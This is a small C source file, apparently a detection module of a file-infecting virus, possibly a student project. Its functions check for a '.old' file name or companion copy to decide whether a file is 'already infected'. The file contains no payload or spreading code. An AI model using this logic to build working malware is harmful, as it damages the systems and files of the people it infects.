//
// Created by armotik on 24/03/25.
//

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include "detection.h"

int a_extension_old(const char *filename) {
    return strstr(filename, ".old") != NULL;
}

int fichier_old_existe(const char *filename) {
    char oldname[MAX_PATH_LEN];
    snprintf(oldname, sizeof(oldname), "%s.old", filename);

    FILE *f = fopen(oldname, "r");
    if (f) {
        fclose(f);
        return 1;
    }
    return 0;
}

int est_deja_infecte(const char *filename) {
    return a_extension_old(filename) || fichier_old_existe(filename);
}